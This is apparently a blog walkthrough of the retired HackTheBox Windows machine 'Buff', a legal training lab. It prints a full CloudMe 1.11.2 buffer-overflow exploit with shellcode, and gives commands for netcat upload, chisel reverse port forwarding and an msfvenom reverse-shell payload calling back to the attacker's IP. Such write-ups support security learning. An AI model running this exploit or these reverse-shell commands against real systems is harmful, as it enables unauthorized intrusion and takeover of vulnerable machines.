---
title: Buff - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-18 12:00:00 
categories: [HackTheBox,Windows]
tags: [rce,chisel]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Buff/00-banner.png
  width: 589
  height: 363
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Buff` a retired windows machine by HackTheBox rated easy. Without further ado, let’s begin.

# Recon
## Nmap Scan

As always we'll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Wed Oct 13 14:15:31 2021 as: nmap -sC -sV -v -Pn -oN nmap-scan 10.129.2.18
Nmap scan report for 10.129.2.18
Host is up (0.22s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

The only port open is running HTTP, let´s check it out.

## HTTP Enumeration

![01-web](/assets/img/HTB/Buff/01-web.png)

Is a web site for a gym, the interesting thing is in `/contact.php`, it says that this site is using `Gym Management Software 1.0`

![02-web](/assets/img/HTB/Buff/02-web.png)

Searching this info on `searchsploit` I found this [RCE](https://www.exploit-db.com/exploits/48506)

![03-rce](/assets/img/HTB/Buff/03-rce.png)

# Initial Foothold

The exploit send a new request every time we send a command that's why we can't move from directory.
Upload a netcat on the victim machine and execute it, like the screenshot below.

![04-python](/assets/img/HTB/Buff/04-python.png)

`rlwrap` gives us access to history

```console
$ sudo apt install rlwrap
```
# Privilage Escalation

I could find a executable file named `CloudMe_1112.exe` inside shaun's downloads directory.

![05-cloudme](/assets/img/HTB/Buff/05-cloudme.png)

And this executable is vulnerable to a Buffer Oveflow

![06-cloudme](/assets/img/HTB/Buff/06-cloudme.png)

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)

```

Looking the code of the exploit, the script connect to a port that we don't have access to it.

![07-port](/assets/img/HTB/Buff/07-port.png)

It seems that we will have to make a remote port forwarding using [chisel](https://github.com/jpillora/chisel/releases), we need one binary for our linux and the other to the Windows machine.

![08-chisel](/assets/img/HTB/Buff/08-chisel.png)

```console
$ gunzip -d chisel_1.7.6*
$ mv chisel_1.7.6_windows_amd64 chisel.exe
$ mv chisel_1.7.6_linux_amd64 chisel
$ chmod +x chisel
```

Once we get the binaries just send the .exe to the vulnerable machine.
Execute this command in attacker machine
```console
$ ./chisel server --reverse --port 1234
```
and this in the victim machine
```console
$ ./chisel client <ipA>:1234 R:8888:localhost:8888
```

![09-chisel](/assets/img/HTB/Buff/09-chisel.png)

To get a shell we need change the payload of the exploit.

```console
$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.70 LPORT=443 -b '\x00\x0A\x0D' -f python
```

![10-payload](/assets/img/HTB/Buff/10-payload.png)

Start a netcat listener on port 443 and run the exploit.

![11-root](/assets/img/HTB/Buff/11-root.png)

We got root.txt
That’s it for now guys. Until next time.
